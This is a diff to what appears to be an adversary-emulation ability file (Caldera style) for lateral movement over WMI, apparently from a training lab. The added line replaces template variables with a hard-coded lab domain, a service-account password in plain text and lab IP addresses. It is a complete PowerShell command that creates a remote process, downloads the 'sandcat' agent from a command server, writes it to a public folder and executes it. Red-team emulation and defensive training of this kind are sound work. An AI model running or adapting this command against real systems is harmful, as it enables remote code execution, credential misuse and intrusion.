@@ -4,17 +4,14 @@
   platforms:
     windows:
       psh:
-        command: '[securestring]$password = ConvertTo-SecureString "#{host.user.password}"
-          -AsPlainText -Force;          [pscredential]$credentials = New-Object System.Management.Automation.PSCredential
-          ("$env:USERDNSDOMAIN\sql_svc", $password);          Invoke-WmiMethod
-          -Path win32_process -Name create -ComputerName "#{remote.host.ip}" -Credential
-          $credentials -ArgumentList ''powershell.exe -C $server=\"#{server}\"; $url=\"$server/file/download\";
-          $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\");
-          $wc.Headers.add(\"defaultServer\", $server); $wc.Headers.add(\"file\",\"sandcat.go\");
-          ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))
-          -and ([io.file]::WriteAllBytes(\"C:\Users\Public\$name.exe\",$data)) | Out-Null;
-          iex \"C:\Users\Public\$name.exe -group APT28 -server $server -v\"'';'
+        command: $password = ConvertTo-SecureString "3g2W31Eo" -AsPlainText -Force; $credentials = New-Object System.Management.Automation.PSCredential("sec699-20.lab\sql_svc", $password); Invoke-WmiMethod -Path win32_process -Name create -ComputerName "192.168.20.104" -Credential $credentials -ArgumentList 'powershell.exe -C $server=\"http://192.168.20.107:8888\"; $url=\"$server/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"defaultServer\", $server); $wc.Headers.add(\"file\",\"sandcat.go\"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\")) -and ([io.file]::WriteAllBytes(\"C:\Users\Public\$name.exe\",$data)) | Out-Null; iex \"C:\Users\Public\$name.exe -group APT28 -server $server -v\"';
   tactic: lateral-movement
   technique:
     attack_id: T1047
     name: Windows Management Instrumentation
+
+
+
+
+
+
